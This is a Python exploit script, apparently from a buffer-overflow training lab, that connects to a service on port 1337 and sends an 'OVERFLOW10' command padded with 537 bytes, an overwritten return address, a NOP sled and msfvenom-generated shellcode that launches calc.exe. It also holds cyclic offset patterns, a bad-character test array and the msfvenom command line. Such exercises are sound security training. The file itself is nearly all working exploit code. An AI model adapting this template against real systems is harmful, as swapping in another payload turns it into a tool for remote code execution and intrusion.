

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = '10.10.204.91'
port = 1337

s.connect((ip,port))

msg = s.recv(2048).decode()
print(msg)
pattern = 'PxQVBDIWEyjNyk6uQxxNpjuX9xm2AZ7Sn5pQiusyyNjQmTNN4gbJxITtltHbn1nyMmaCLYUk1NVFp2kWmzrRxhzTHOiG76aZXJ7aaODIYKiealduyGUOLHQXXjuoSUmLMqGtEuezVXIBMmVruTAxw8jfwfBnp9uZbhn7Rb5Wj0CYFjJ6EOEx5RzXQeJRzp7knkY19NwJDEJfGRFExy70e6jztHhXinstz23WgdjiYpmZl0RLxpPRPCMjIBsl7N3XGiOtigErqE4QP0ukGlRKeZ9yXBhjVvkBE2WpATryLo5WKhHd2jmbrVZ0Xm7xHfuqogtbUgt8qQ0fQGeDQypW1PmbIALFwwv28btHYZW2VU9hsQcqMXD85yAqaFYDKD7NEp70Xvg7XnC3M3vdQo84X6dljUWu0XJ75H2MElIrT8VCPz8i8OgYCgAsb4DrFBDhZNHwcrfvHEliqfAsJefufmtWuxRb6QXhcJaVhbDQPO7TJAtRc9lNXl9GKFP8uKX1quMNPw2eYtZsv0tAdvT4WyLwM9ZsnViIuc6FlpL8Bd1Rmn0tYerIeCdj552Vske0ewyGnkniCVKbaCLSJoB1qcQl8RcgWftyw8LzXT4V4GnMuWL6m7VMUwDSE4gUR8f8n5BQB2HKtcp5OyGD8p91UIhKUO4Wq2Z3370XC2mqgZzWEkw2OcPQ3uAaEOhc7X1YIrAuoLE79FEJf6z0hNFnR5TPA4PqxTKd3jq06QGRedFhgiXiuBfuSPrOYdalvEytjnx78wCKs4rHAs3S3Rn4BiH6y8Egt3v2qWMGS5JPSefIqMCHAkLgrZkTmDeoki05tcblCV1GHh8ytuJHMhtMIrnuiVdoSEZNK6BqUEaNz4oPbBxEmMxAB2oNuZLCxdyBvuagVLTI2KUcCOotuDj1WcSrdfdNAuLm2j2Nj4Sz2AV9YnMxM3dMTgdt4c4p5qGnGaEvv3JVtrknRtQhnRloVW3mr2xQmJJrxi73iNcv'
allbytes = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

pattern = 'BESnsCexPiWfRqrpBjsSPXqT2D3V79L7hrGgQuhaX1pNIjt7U30IkHCxWYgSpDIlgRFpGMkz3DAquKwtUZUbJIawfDflpXJQ63bA7RoefXYk8qQuyQjDHOe1nq00HsOvgSdAlQr5pOKXL6BCkpXhybOLK0oTKSvw0G94FPUl5wCUtCu5qVODgJg14vbm1Oo6BE4kCnVTTIpnH71p57NrEC2FYlQG3G9N8zH5O70xJitLjBhx7tgDiP1wyVEYRClrLObPcNvIlOjiYgrlw9495HsRHOzhhxEVCAPNtA8YeRMaSbs452xDbkkbZodhZo19VNupdd5qk91kQ2SJ7VnKu5ie0O95UlLI6PaI7vz7O0FATx7IWNqbZAOz9LTJd2ZJYKtYFZxQ91i4c1KheQFXMCEBKFOlnBJLEdevNYua3oQmgXmSaYjd7B8jetlh0z0NkevdrK3Wxw8yeC7rDcyrGi4fh2mBBF0hrHzYBmWCBliFe8foSqbzCiigsocAWX9WisTvOR1NTWGijHLM98l3c9mxkuq44lHPdw8dXX8tzpw0gY4aEe6QbzTXbeqnqucDxvxsgsCAVvtjLxH7KFonwGRjCGKLNUgnb53FSaZvK7JylaQ3IcZvK68FLtHJ8t6Y70XJP3SzwoiLZ0ROwj08IcOSU0SSd9uSizFIITCt41tlS7tz7dKHheE6U6pPl7tTrTw3gGwbHyVmN03de9khma1LKmvYrxhpB7vasJJ5ochXy1QagOvIKeiTHU5gI0aqPYaqjDxc5bo2k9CHLctQutr3jtsg7Czk2dMpHZvU27JrAaVWbUF4IHFKTR08CXVqj3Ix7Yc0D4qPdiQcWqJhNQNqp38QrkUihhhW0O4JEQfd9zI6wd78uxd3a2moMjWLQ6MeV43KUkVseEvT5iXv2RBHVU9H3IxdA5NbVGyumIGxc0RoiseylJ9ezCyJUrtJbChl3luqv7ZbV31OiORuO6hj31tJYYoNWkFBSGIeKi2eAfpzvfNOZyB5CkyDU8NNq7D79R71U6muaJaIY134PW3xgn902sfQCQbbHeKGqNbETKjIybz8aK2YshW1Zc2k1DTSggWPdzFYZ2P5Z1WjM2YvTIfov1cogCR4iZUIcbpC87iybu31bmmnqEi7ByblwQW7FT3oaSSJ937TF5M2LrWMKvR0IcMrz67NwMrHq1wRO5GhuXHHpfTNoc4Q7TfasNhyLsa2WDJ4Lz4mQWfSKwbpSqqb1C94AzrQMqUARlkKkav7lLM405sxstEywxKh7cNl4oipXhu5ZC63hntnPLHMcwUdJpoChA65IYm1JYVOwRLxRbkQcyQN8paynSdmXzO84jofKlHhiSMpRGvlEfcjYx7Y6naQnDr45v0bJtPVtmp9E6XQnNRlL4TTI7a3IXwm6JxcVceX72NxhfPudFzUCCiXlxFQ9aJMosKoc0jSXI8mBVyeIgNcE1aPPJLhsELD4uegV71zGauRhHHCXM5TMRQg'

# 017AFA30   6450486C  lHPd	esp 541
# \x00\xa0\xad\xbe\xde\xef

junk = 'A'*537

eip = '\xaf\x11\x50\x62'
esp = '\x90'*32
#  msfvenom -p windows/exec cmd=calc.exe -b "\x00\xa0\xad\xbe\xde\xef" -f c

esp += ("\xbd\xae\x8d\x9a\x62\xda\xd0\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x31\x31\x6e\x13\x83\xc6\x04\x03\x6e\xa1\x6f\x6f\x9e\x55\xed"
"\x90\x5f\xa5\x92\x19\xba\x94\x92\x7e\xce\x86\x22\xf4\x82\x2a"
"\xc8\x58\x37\xb9\xbc\x74\x38\x0a\x0a\xa3\x77\x8b\x27\x97\x16"
"\x0f\x3a\xc4\xf8\x2e\xf5\x19\xf8\x77\xe8\xd0\xa8\x20\x66\x46"
"\x5d\x45\x32\x5b\xd6\x15\xd2\xdb\x0b\xed\xd5\xca\x9d\x66\x8c"
"\xcc\x1c\xab\xa4\x44\x07\xa8\x81\x1f\xbc\x1a\x7d\x9e\x14\x53"
"\x7e\x0d\x59\x5c\x8d\x4f\x9d\x5a\x6e\x3a\xd7\x99\x13\x3d\x2c"
"\xe0\xcf\xc8\xb7\x42\x9b\x6b\x1c\x73\x48\xed\xd7\x7f\x25\x79"
"\xbf\x63\xb8\xae\xcb\x9f\x31\x51\x1c\x16\x01\x76\xb8\x73\xd1"
"\x17\x99\xd9\xb4\x28\xf9\x82\x69\x8d\x71\x2e\x7d\xbc\xdb\x24"
"\x80\x32\x66\x0a\x82\x4c\x69\x3a\xeb\x7d\xe2\xd5\x6c\x82\x21"
"\x92\x83\xc8\x68\xb2\x0b\x95\xf8\x87\x51\x26\xd7\xcb\x6f\xa5"
"\xd2\xb3\x8b\xb5\x96\xb6\xd0\x71\x4a\xca\x49\x14\x6c\x79\x69"
"\x3d\x0f\x1c\xf9\xdd\xfe\xbb\x79\x47\xff")

junk2 = 'D'*(1500-len(junk+eip+esp))

payload = 'OVERFLOW10 ' + junk + eip + esp + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
